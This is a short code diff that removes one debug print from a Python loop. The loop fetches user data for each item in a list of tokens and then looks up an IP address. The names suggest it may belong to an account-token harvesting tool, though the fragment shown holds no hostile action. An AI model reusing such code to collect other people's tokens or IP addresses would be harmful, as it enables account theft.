@@ -467,7 +467,6 @@ def main():
     for token in tokens:
         try:
             user_data = getuserdata(token)
-            print(user_data)
             if not user_data:
                 continue
             ip = getip()
